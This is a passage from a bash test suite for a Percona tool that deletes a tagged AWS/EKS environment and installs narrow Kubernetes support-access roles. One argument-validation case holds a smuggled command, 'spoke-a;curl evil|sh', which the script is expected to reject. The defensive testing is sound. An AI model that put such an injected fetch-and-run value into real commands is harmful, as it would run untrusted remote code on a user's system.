FAKE_DEL_CLUSTER=ABSENT FAKE_DEL_BUCKETS="" FAKE_DEL_USERS="" FAKE_DEL_STACK=ABSENT del_world
del_run spoke-a --delete --name spoke-a --region us-west-2
[[ "$DEL_RC" != 0 ]] || fail "a delete with nothing to delete exited 0: $(cat "${DEL}/out")"
[[ -z "$(del_mutations)" ]] || fail "a delete with nothing found still deleted: $(del_mutations)"
grep -q "to confirm: " "${DEL}/out" && fail "a delete with nothing found still asked to confirm: $(cat "${DEL}/out")"
grep -q "percona.com/pds=spoke-a" "${DEL}/out" || fail "the empty result did not name the tag it searched for: $(cat "${DEL}/out")"
pass "--delete says so when nothing carries the environment's tag"

# --- a bucket the join could not tag is not found, and the run says so ---
FAKE_DEL_BUCKETS="" del_world
del_run spoke-a --delete --name spoke-a --region us-west-2
[[ "$DEL_RC" == 0 ]] || fail "a missing tagged bucket stopped the delete (${DEL_RC}): $(cat "${DEL}/out")"
grep -q "pds-<account id>-spoke-a" "${DEL}/out" \
  || fail "the run did not say how to find a bucket it could not tag: $(cat "${DEL}/out")"
pass "--delete says what to check when no bucket carries the tag"

# --- a user, bucket or stack of another environment is never touched ---
FAKE_DEL_BUCKETS=$'pds-123456789012-spoke-a spoke-a\npds-123456789012-spoke-b spoke-b' \
  FAKE_DEL_USERS=$'pds-spoke-a spoke-a\npds-spoke-b spoke-b\nalice' del_world
del_run spoke-a --delete --name spoke-a --region us-west-2
[[ "$DEL_RC" == 0 ]] || fail "a delete beside another environment failed (${DEL_RC}): $(cat "${DEL}/out")"
del_mutations | grep -q "spoke-b" && fail "something of spoke-b was deleted: $(del_mutations)"
del_mutations | grep -q "alice" && fail "an untagged user was deleted: $(del_mutations)"
grep -q "spoke-b" "${DEL}/world/buckets" && grep -q "spoke-b" "${DEL}/world/users" \
  || fail "the other environment's bucket or user is gone: $(cat "${DEL}/world/buckets" "${DEL}/world/users")"
pass "--delete leaves another environment's resources alone"

# --- the EKS cluster's own stack is what is left when eksctl failed half way ---
# A rerun finds no EKS cluster, and the VPC, nodes and NAT gateway still bill
# from a stack that never finished deleting.
FAKE_DEL_CLUSTER=ABSENT FAKE_DEL_CLUSTER_STACK=spoke-a del_world
del_run spoke-a --delete --name spoke-a --region us-west-2
[[ "$DEL_RC" == 0 ]] || fail "a delete of a leftover EKS cluster stack failed (${DEL_RC}): $(cat "${DEL}/out")"
del_called "^eksctl delete cluster --name spoke-a" \
  || fail "the stack an earlier delete left behind was not deleted: $(cat "${DEL}/calls")"
del_called "^kubectl " && fail "kubectl ran for an EKS cluster that is gone: $(cat "${DEL}/calls")"
grep -q "eksctl-spoke-a-cluster" "${DEL}/out" || fail "the plan did not name the leftover stack: $(cat "${DEL}/out")"
[[ ! -e "${DEL}/world/stack.eksctl-spoke-a-cluster" ]] || fail "the leftover stack is still in the account"

# A stack of that name that carries no tag for this environment is not the join's.
FAKE_DEL_CLUSTER=ABSENT FAKE_DEL_CLUSTER_STACK=another-env del_world
del_run spoke-a --delete --name spoke-a --region us-west-2
del_called "^eksctl " && fail "eksctl ran for a stack tagged for another environment: $(cat "${DEL}/calls")"
pass "--delete finishes an EKS cluster stack an earlier delete left behind"

# --- eksctl reporting success is not taken as proof ---
del_world
FAKE_DEL_CLUSTER_SURVIVES=1 del_run spoke-a --delete --name spoke-a --region us-west-2
[[ "$DEL_RC" != 0 ]] || fail "a delete that left the EKS cluster standing exited 0: $(cat "${DEL}/out")"
del_called "^aws s3 rb" && fail "the bucket was deleted while the EKS cluster still stood: $(cat "${DEL}/calls")"
del_called "^aws iam delete-user" && fail "the IAM user was deleted while the EKS cluster still stood: $(cat "${DEL}/calls")"
grep -q "still there" "${DEL}/out" || fail "the run did not say the EKS cluster is still there: $(cat "${DEL}/out")"
pass "--delete reads the EKS cluster back and keeps the bucket and user when it is still there"

# --- a volume that will not detach is said so and the rest is still deleted ---
FAKE_DEL_VOLUMES=$'vol-0ccc in-use\n' del_world
WAIT_INTERVAL=0 FAKE_DEL_PV_HANDLES=$'ebs.csi.aws.com vol-0ccc ebs.csi.aws.com\n' \
  del_run spoke-a --delete --name spoke-a --region us-west-2
[[ "$DEL_RC" != 0 ]] || fail "an EBS volume still in use exited 0: $(cat "${DEL}/out")"
grep -q "vol-0ccc is in-use" "${DEL}/out" || fail "the volume that stayed was not named: $(cat "${DEL}/out")"
grep -qF "aws ec2 delete-volume --region us-west-2 --volume-id vol-0ccc" "${DEL}/out" \
  || fail "the volume that stayed was not printed with the command that deletes it, and a rerun cannot find it: $(cat "${DEL}/out")"
del_called "^aws ec2 delete-volume" && fail "a volume in use was deleted: $(cat "${DEL}/calls")"
del_called "^aws s3 rb" || fail "a volume that stayed stopped the bucket delete: $(cat "${DEL}/calls")"
pass "--delete names an EBS volume it cannot delete and still deletes the rest"

# --- a wrong region must not look like a finished environment ---
# IAM is global, so the backup user is found in any region, and its key may be
# the one a live environment's backups use.
FAKE_DEL_CLUSTER=ABSENT FAKE_DEL_BUCKETS="" FAKE_DEL_STACK=ABSENT del_world
del_run spoke-a --delete --name spoke-a --region us-east-1
grep -q "There is no EKS cluster named spoke-a in us-east-1" "${DEL}/out" \
  || fail "the plan did not say there is no EKS cluster in the region: $(cat "${DEL}/out")"
grep -q "Only the backup IAM user was found" "${DEL}/out" \
  || fail "the plan did not warn that only the user was found: $(cat "${DEL}/out")"
grep -q "another region" "${DEL}/out" || fail "the warning did not mention another region: $(cat "${DEL}/out")"
pass "--delete warns when only the IAM user was found, which a wrong region does too"

# --- a tag that cannot be read stops the run before anything is deleted ---
del_world
FAKE_DEL_TAGS_RC=1 del_run spoke-a --delete --name spoke-a --region us-west-2
[[ "$DEL_RC" != 0 ]] || fail "unreadable user tags did not stop the delete: $(cat "${DEL}/out")"
[[ -z "$(del_mutations)" ]] || fail "something was deleted with a user's tags unread: $(del_mutations)"
grep -q "Nothing was deleted" "${DEL}/out" || fail "the refusal did not say nothing was deleted: $(cat "${DEL}/out")"
pass "--delete stops when it cannot read an IAM user's tags"

# --- a bucket the tag search lists after it is gone is already deleted ---
del_world
FAKE_DEL_RB_ERR=NoSuchBucket del_run spoke-a --delete --name spoke-a --region us-west-2
[[ "$DEL_RC" == 0 ]] || fail "a bucket that was already gone failed the delete (${DEL_RC}): $(cat "${DEL}/out")"
pass "--delete treats a bucket that is already gone as deleted"

# --- what the tag search still lists is reported, not hidden ---
del_world
FAKE_DEL_STRAY=arn:aws:ec2:us-west-2:123456789012:vpc/vpc-0123 del_world
del_run spoke-a --delete --name spoke-a --region us-west-2
[[ "$DEL_RC" == 0 ]] || fail "a lagging tag search failed the delete (${DEL_RC}): $(cat "${DEL}/out")"
grep -q "still listed" "${DEL}/out" || fail "what the tag search still lists was not reported: $(cat "${DEL}/out")"
grep -q "vpc-0123" "${DEL}/out" || fail "the leftover was not named: $(cat "${DEL}/out")"
grep -qF "aws resourcegroupstaggingapi get-resources --region us-west-2 --tag-filters Key=percona.com/pds,Values=spoke-a" "${DEL}/out" \
  || fail "the run did not print the command that checks again, though a rerun finds nothing to delete: $(cat "${DEL}/out")"
grep -q "any more" "${DEL}/out" && fail "the run claimed nothing was tagged with something still listed: $(cat "${DEL}/out")"
del_world
del_run spoke-a --delete --name spoke-a --region us-west-2
grep -q "carries the tag percona.com/pds=spoke-a any more" "${DEL}/out" \
  || fail "a clean delete did not say nothing is tagged any more: $(cat "${DEL}/out")"
pass "--delete reports what the tag search still lists and says nothing is left only when that is true"

# --- without kubectl the databases and load balancers are skipped, with a warning ---
mkdir -p "${DEL}/nokube-bin"
for tool in bash awk mv mktemp rm grep sed tr cat sleep; do
  ln -sf "$(command -v "$tool")" "${DEL}/nokube-bin/${tool}"
done
ln -sf "${DEL}/bin/aws" "${DEL}/nokube-bin/aws"
ln -sf "${DEL}/bin/eksctl" "${DEL}/nokube-bin/eksctl"
del_world
DEL_CHILD_PATH="${DEL}/nokube-bin" del_run spoke-a --delete --name spoke-a --region us-west-2
[[ "$DEL_RC" == 0 ]] || fail "a host with no kubectl stopped the delete (${DEL_RC}): $(cat "${DEL}/out")"
grep -q "kubectl is not installed" "${DEL}/out" || fail "a missing kubectl was not warned about: $(cat "${DEL}/out")"
del_called "^kubectl " && fail "kubectl ran on a host without it: $(cat "${DEL}/calls")"
del_called "^eksctl delete cluster" || fail "the EKS cluster was not deleted without kubectl: $(cat "${DEL}/calls")"
pass "--delete warns and carries on when kubectl is not installed"

# --- only volumes Kubernetes provisioned for a claim are deleted ---
# A volume a customer attached by hand, one with another driver, and anything
# that is not a volume ID are never on the list, even if they turn up in the
# volume list and are available.
FAKE_DEL_VOLUMES=$'vol-0aaa available\nvol-0ddd available\nvol-0eee available\n' del_world
FAKE_DEL_PV_HANDLES=$'ebs.csi.aws.com vol-0aaa ebs.csi.aws.com\nebs.csi.aws.com vol-0ddd\nother.csi vol-0eee other.csi\nebs.csi.aws.com ../../x ebs.csi.aws.com\n' \
  del_run spoke-a --delete --name spoke-a --region us-west-2
[[ "$DEL_RC" == 0 ]] || fail "a delete with volumes of several kinds failed (${DEL_RC}): $(cat "${DEL}/out")"
del_called "^aws ec2 delete-volume --region us-west-2 --volume-id vol-0aaa" \
  || fail "the volume Kubernetes provisioned was not deleted: $(cat "${DEL}/calls")"
for volume in vol-0ddd vol-0eee "../../x"; do
  grep -q "delete-volume.*${volume}" "${DEL}/calls" && fail "${volume} was not provisioned by the EBS CSI driver and was deleted: $(cat "${DEL}/calls")"
  grep -q "describe-volumes.*${volume}" "${DEL}/calls" && fail "${volume} was looked up though it is not a provisioned volume: $(cat "${DEL}/calls")"
done
grep -q "vol-0aaa" "${DEL}/out" || fail "the plan did not list the volume it will delete: $(cat "${DEL}/out")"
pass "--delete deletes only EBS volumes the CSI driver provisioned for a claim"

# --- a delete that cannot save the volumes says they may stay ---
del_world
FAKE_DEL_KUBECTL_RC=1 del_run spoke-a --delete --name spoke-a --region us-west-2
grep -q "EBS volumes of its databases may stay in your account" "${DEL}/out" \
  || fail "an EKS cluster kubectl cannot reach was deleted without saying its volumes may stay: $(cat "${DEL}/out")"

# --- a step that fails on the databases does not stop the delete ---
del_world
FAKE_DEL_KUBECTL_DB_RC=1 del_run spoke-a --delete --name spoke-a --region us-west-2
[[ "$DEL_RC" == 0 ]] || fail "a database delete that failed stopped the EKS cluster delete (${DEL_RC}): $(cat "${DEL}/out")"
del_called "^eksctl delete cluster" || fail "the EKS cluster was not deleted after the databases would not go: $(cat "${DEL}/calls")"
grep -q "Carrying on" "${DEL}/out" || fail "a database delete that failed was not warned about: $(cat "${DEL}/out")"
pass "--delete warns about volumes it cannot save and databases it cannot delete, and carries on"

# --- a stack that cannot be read is never taken as gone ---
del_world
FAKE_DEL_STACK_ERR=1 del_run spoke-a --delete --name spoke-a --region us-west-2
[[ "$DEL_RC" != 0 ]] || fail "an unreadable stack did not stop the delete: $(cat "${DEL}/out")"
[[ -z "$(del_mutations)" ]] || fail "something was deleted with a stack unread: $(del_mutations)"
grep -q "AccessDenied" "${DEL}/out" || fail "the refusal did not say why the stack could not be read: $(cat "${DEL}/out")"

del_world
FAKE_DEL_STACK_ERR_AFTER=1 del_run spoke-a --delete --name spoke-a --region us-west-2
[[ "$DEL_RC" != 0 ]] || fail "a stack that could not be read after the delete exited 0: $(cat "${DEL}/out")"
del_called "^aws s3 rb" && fail "the bucket was deleted though the EKS cluster's stack could not be confirmed gone: $(cat "${DEL}/calls")"
del_called "^aws iam delete-user" && fail "the IAM user was deleted though the EKS cluster's stack could not be confirmed gone: $(cat "${DEL}/calls")"
pass "--delete stops when a stack cannot be read, before and after the EKS cluster delete"

# --- every lookup that fails says why and deletes nothing ---
del_world
FAKE_DEL_STS_RC=1 del_run spoke-a --delete --name spoke-a --region us-west-2
[[ "$DEL_RC" != 0 && -z "$(del_mutations)" ]] || fail "a failed sign-in did not stop the delete before it deleted anything: $(cat "${DEL}/out")"
grep -q "could not read the AWS account" "${DEL}/out" || fail "the sign-in failure was not said: $(cat "${DEL}/out")"

del_world
FAKE_DEL_TAGAPI_RC=1 del_run spoke-a --delete --name spoke-a --region us-west-2
[[ "$DEL_RC" != 0 && -z "$(del_mutations)" ]] || fail "a failed tag search did not stop the delete before it deleted anything: $(cat "${DEL}/out")"
grep -q "could not list the S3 buckets" "${DEL}/out" || fail "the tag search failure was not said: $(cat "${DEL}/out")"
grep -q "AccessDeniedException" "${DEL}/out" || fail "the tag search failure did not show AWS's reason: $(cat "${DEL}/out")"

del_world
FAKE_DEL_TAGS_RC=1 del_run spoke-a --delete --name spoke-a --region us-west-2
grep -q "pds-spoke-a" "${DEL}/out" && grep -q "AccessDenied" "${DEL}/out" \
  || fail "a tag that could not be read did not name the user and AWS's reason: $(cat "${DEL}/out")"

FAKE_DEL_CLUSTER=UNREADABLE del_world
del_run spoke-a --delete --name spoke-a --region us-west-2
grep -q "AccessDeniedException" "${DEL}/out" || fail "an EKS cluster that could not be read did not show AWS's reason: $(cat "${DEL}/out")"
pass "--delete shows why a lookup failed and deletes nothing"

# --- a delete that fails part way keeps going, says what failed and exits non-zero ---
del_world
FAKE_DEL_RB_ERR=AccessDenied del_run spoke-a --delete --name spoke-a --region us-west-2
[[ "$DEL_RC" != 0 ]] || fail "a bucket that could not be deleted exited 0: $(cat "${DEL}/out")"
grep -q "could not delete S3 bucket" "${DEL}/out" || fail "the bucket that stayed was not named: $(cat "${DEL}/out")"
del_called "^aws iam delete-user --user-name pds-spoke-a" || fail "a bucket that would not go stopped the user delete: $(cat "${DEL}/calls")"

del_world
FAKE_DEL_IAM_DELETE_RC=1 del_run spoke-a --delete --name spoke-a --region us-west-2
[[ "$DEL_RC" != 0 ]] || fail "an IAM user that could not be deleted exited 0: $(cat "${DEL}/out")"
grep -q "could not delete IAM user pds-spoke-a" "${DEL}/out" || fail "the user that stayed was not named: $(cat "${DEL}/out")"

del_world
FAKE_DEL_STACK_SURVIVES=1 FAKE_DEL_DELETE_STACK_RC=1 del_run spoke-a --delete --name spoke-a --region us-west-2
[[ "$DEL_RC" != 0 ]] || fail "a role stack that could not be deleted exited 0: $(cat "${DEL}/out")"
grep -q "could not delete the EBS CSI role stack" "${DEL}/out" || fail "the stack that stayed was not named: $(cat "${DEL}/out")"
del_called "^aws s3 rb" || fail "a stack that would not go stopped the bucket delete: $(cat "${DEL}/calls")"
grep -q "Now disconnect" "${DEL}/out" && fail "a delete that failed part way still told the reader to disconnect: $(cat "${DEL}/out")"
pass "--delete reports what it could not delete and exits non-zero"

# --- the arguments ---
for args in \
  "--delete --region us-west-2" \
  "--delete --name spoke-a" \
  "--name spoke-a --region us-west-2" \
  "--delete --name spoke-a --region us-west-2 --token t" \
  "--delete --name spoke-a --region us-west-2 --update" \
  "--delete --name spoke-a --region us-west-2 --local" \
  "--delete --name spoke-a --region us-west-2 --dry-run" \
  "--delete --name Spoke_A --region us-west-2" \
  "--delete --name spoke-a --region nowhere" \
  "--delete --name 'spoke-a;curl evil|sh' --region us-west-2"; do
  del_world
  # shellcheck disable=SC2086
  eval "del_run spoke-a ${args}"
  [[ "$DEL_RC" != 0 ]] || fail "'${args}' was accepted: $(cat "${DEL}/out")"
  [[ ! -s "${DEL}/calls" ]] || fail "'${args}' reached AWS before it was refused: $(cat "${DEL}/calls")"
done
del_world
del_run spoke-a --delete --name spoke-a --region us-west-2 --token t
grep -q -- "--token" "${DEL}/out" || fail "the refusal did not name the flag it refused: $(cat "${DEL}/out")"
pass "--delete takes --name and --region and nothing else, and checks both before it calls AWS"

# --- the usage text documents it ---
usage_del="$(bash "${SCRIPT}" --help 2>&1 || true)"
[[ "$usage_del" == *"--delete --name"*"--region"* ]] \
  || fail "the usage text does not show how to run --delete: ${usage_del}"
[[ "$usage_del" == *"type the environment name"* ]] \
  || fail "the usage text does not say --delete asks for the environment name: ${usage_del}"
[[ "$usage_del" == *"disconnect"* ]] \
  || fail "the usage text does not say to disconnect in the console afterwards: ${usage_del}"
pass "the usage text documents --delete"

# --- support access: the standing roles, namespace and agent grant ---
# Everything a window needs on the environment is installed once, so opening one
# later asks the customer for nothing. The manifests are read back from what the
# fake kubectl was fed.
cat >"${WORK}/rules.py" <<'PYRULES'
import re
import sys

# Reads the manifests install_support_access applies. They keep every rule on
# flow-style lines, so this reads them without a YAML library.
docs = []
raw = {}
for text in open(sys.argv[1]).read().split("\n---\n"):
    kind = re.search(r"^kind: (\S+)", text, re.M)
    name = re.search(r"^  name: (\S+)", text, re.M)
    if not kind or not name:
        continue
    rules = []
    for chunk in re.split(r"^  - (?=apiGroups:)", text, flags=re.M)[1:]:
        rule = {}
        for field in ("apiGroups", "resources", "resourceNames", "verbs"):
            m = re.search(field + r": \[(.*)\]", chunk)
            rule[field] = [x.strip().strip('"') for x in m.group(1).split(",") if x.strip()] if m else []
        rules.append(rule)
    docs.append((kind.group(1), name.group(1), rules))
    raw[(kind.group(1), name.group(1))] = text


def find(kind, name):
    for d in docs:
        if d[0] == kind and d[1] == name:
            return d[2]
    sys.exit("missing %s %s" % (kind, name))


def grants(rules, group, resource, verb):
    return any(
        group in r["apiGroups"] and resource in r["resources"] and verb in r["verbs"]
        for r in rules
    )


def check(cond, msg):
    if not cond:
        sys.exit(msg)


READ = ["get", "list", "watch"]
DATABASE_WRITES = {
    "core.openeverest.io": ["instances"],
    "backup.openeverest.io": ["backups", "restores"],
}

find("Namespace", "pds-support")
read = find("ClusterRole", "pds-support-read")
admin = find("ClusterRole", "pds-support-admin")
agent = find("ClusterRole", "pds-support-agent")
agent_ns = find("Role", "pds-support-agent")
proxy = find("ClusterRole", "pds-support-proxy")
secrets = find("Role", "pds-support-secrets")
find("RoleBinding", "pds-support-secrets")

check(grants(read, "", "pods", "get") and grants(read, "", "pods/log", "get"), "read only cannot look at pods and logs")
check(grants(read, "", "nodes", "list"), "read only cannot list nodes")
check(grants(read, "rbac.authorization.k8s.io", "clusterrolebindings", "get"), "read only cannot read the bindings")
check(all(r["verbs"] == READ for r in read), "read only has a verb that writes")

for name, rules in (("read only", read), ("admin", admin)):
    for r in rules:
        for resource in ("secrets", "pods/exec", "pods/attach", "pods/portforward", "serviceaccounts/token"):
            check(resource not in r["resources"], "%s reaches %s" % (name, resource))
        check("*" not in r["apiGroups"] and "*" not in r["verbs"], "%s has a wildcard rule: %s" % (name, r))
        check("*" not in r["resources"] or set(r["verbs"]) <= set(READ), "%s writes every resource of a group: %s" % (name, r))
        check(not {"impersonate", "escalate", "bind"} & set(r["verbs"]), "%s can escalate: %s" % (name, r))

check(grants(admin, "", "pods", "get"), "admin cannot read what read only reads")
check(grants(admin, "", "pods", "delete"), "admin cannot restart a pod")
check(grants(admin, "core.openeverest.io", "instances", "patch"), "admin cannot change a database")
# Deleting a database or a backup cannot be undone, and an engineer never needs
# to: the customer does that from the console, under their own name.
check(not grants(admin, "core.openeverest.io", "instances", "delete"), "admin can delete a database")
check(not grants(admin, "backup.openeverest.io", "backups", "delete"), "admin can delete a backup")
check(grants(admin, "backup.openeverest.io", "restores", "create"), "admin cannot restore a backup")
for r in admin:
    if set(r["verbs"]) <= set(READ):
        continue
    restart = r["apiGroups"] == [""] and r["resources"] == ["pods"] and r["verbs"] == ["delete"]
    database = len(r["apiGroups"]) == 1 and set(r["resources"]) <= set(DATABASE_WRITES.get(r["apiGroups"][0], []))
    check(restart or database, "admin writes outside the allowlist, so it could reach the access workload or the agent: %s" % r)

check(
    any(
        r["resources"] == ["clusterroles"] and r["verbs"] == ["bind"] and r["resourceNames"] == ["pds-support-read", "pds-support-admin"]
        for r in agent
    ),
    "the agent cannot bind the two fixed roles, and only those",
)

# The proxy impersonates the engineer into the one group the windows bind. Users
# cannot be named, because they are the engineers' logins, but a group can: so
# it cannot impersonate system:masters or any group a binding already trusts.
check(all(r["verbs"] == ["impersonate"] for r in proxy), "the proxy's role has a verb besides impersonate: %s" % proxy)
check(
    sorted((r["resources"][0], tuple(r["resourceNames"])) for r in proxy)
    == [("groups", ("pds.percona.com:support",)), ("users", ())],
    "the proxy may impersonate something besides engineers and the one support group: %s" % proxy,
)
check(all(r["apiGroups"] == [""] and len(r["resources"]) == 1 for r in proxy), "the proxy's impersonation is not on single core resources: %s" % proxy)
binding = raw[("ClusterRoleBinding", "pds-support-proxy")]
check(re.search(r"roleRef:\n  apiGroup: \S+\n  kind: ClusterRole\n  name: pds-support-proxy\n", binding), "the proxy's role is not bound by a ClusterRoleBinding")
check(re.search(r"subjects:\n  - kind: ServiceAccount\n    name: pds-support-proxy\n    namespace: pds-support\s*$", binding), "the proxy's role is bound to something besides the proxy's account: %s" % binding)
for r in agent + agent_ns:
    check("*" not in r["apiGroups"] and "*" not in r["verbs"] and "*" not in r["resources"], "the agent has a wildcard rule: %s" % r)
    check(not {"escalate", "impersonate"} & set(r["verbs"]), "the agent can escalate: %s" % r)
    check("bind" not in r["verbs"] or r["resourceNames"], "the agent can bind any role: %s" % r)
check(grants(agent, "rbac.authorization.k8s.io", "clusterrolebindings", "create"), "the agent cannot create a binding")
check(grants(agent, "rbac.authorization.k8s.io", "clusterrolebindings", "delete"), "the agent cannot remove a binding")
for resource in ("serviceaccounts", "configmaps", "secrets"):
    check(grants(agent_ns, "", resource, "create") and grants(agent_ns, "", resource, "delete"), "the agent cannot manage %s in the access namespace" % resource)
check(grants(agent_ns, "apps", "deployments", "create") and grants(agent_ns, "apps", "deployments", "delete"), "the agent cannot manage the workload Deployment")

check(grants(secrets, "", "secrets", "get") and grants(secrets, "", "secrets", "update"), "the workload cannot keep its state Secret")
check(all("list" not in r["verbs"] and "delete" not in r["verbs"] for r in secrets), "the workload can list or delete Secrets")
PYRULES

: >"${WORK}/applied.yaml"
: >"${WORK}/calls"
(
  trap - EXIT
  PLATFORM_NAMESPACE="everest-system"
  PLATFORM_RELEASE="pds"
  install_support_access >"${WORK}/support.out" 2>&1
) || fail "install_support_access failed: $(cat "${WORK}/support.out")"
python3 "${WORK}/rules.py" "${WORK}/applied.yaml" >"${WORK}/rules.out" 2>&1 \
  || fail "the support access roles are wrong: $(cat "${WORK}/rules.out")"
grep -q "^kubectl apply" "${WORK}/calls" || fail "install_support_access did not apply anything"
grep -Eq 'name: pds$' "${WORK}/applied.yaml" || fail "the agent grant does not name the agent's service account"
pass "support access installs the roles, the namespace and a narrow agent grant"

# The agent runs as whatever service account the chart gave it, so the grant
# follows the Deployment rather than assuming a name.
: >"${WORK}/applied.yaml"
(
  trap - EXIT
  PLATFORM_NAMESPACE="everest-system"
  PLATFORM_RELEASE="pds"
  FAKE_AGENT_SA="pds-custom" install_support_access >/dev/null 2>&1
) || fail "install_support_access failed for a renamed service account"
grep -Eq 'name: pds-custom$' "${WORK}/applied.yaml" || fail "the agent grant ignored the Deployment's service account"
pass "support access grants the service account the agent runs as"

# A re-run changes nothing: the same manifests, only declaratively applied.
cp "${WORK}/applied.yaml" "${WORK}/applied.first"
: >"${WORK}/applied.yaml"
: >"${WORK}/calls"
(
  trap - EXIT
  PLATFORM_NAMESPACE="everest-system"
  PLATFORM_RELEASE="pds"
  FAKE_AGENT_SA="pds-custom" install_support_access >/dev/null 2>&1
) || fail "a second install_support_access failed"
cmp -s "${WORK}/applied.first" "${WORK}/applied.yaml" || fail "a re-run applied different manifests"
grep -Eq '^kubectl (create|delete|patch|replace|label|annotate)' "${WORK}/calls" \
  && fail "a re-run used a command that is not idempotent: $(cat "${WORK}/calls")"
pass "support access can be re-run without changing anything"

# Without the agent's service account there is nothing to grant, and a grant
# to a guessed name would leave the agent unable to open a window.
(
  trap - EXIT
  PLATFORM_NAMESPACE="everest-system"
  PLATFORM_RELEASE="pds"
  FAKE_AGENT_SA="none" install_support_access >"${WORK}/support.err" 2>&1
) && fail "install_support_access carried on without the agent's service account"
grep -q "Contact Percona support" "${WORK}/support.err" || fail "the refusal does not say what to do: $(cat "${WORK}/support.err")"
pass "support access refuses when the agent's service account cannot be found"

echo "all connect_bootstrap tests passed"
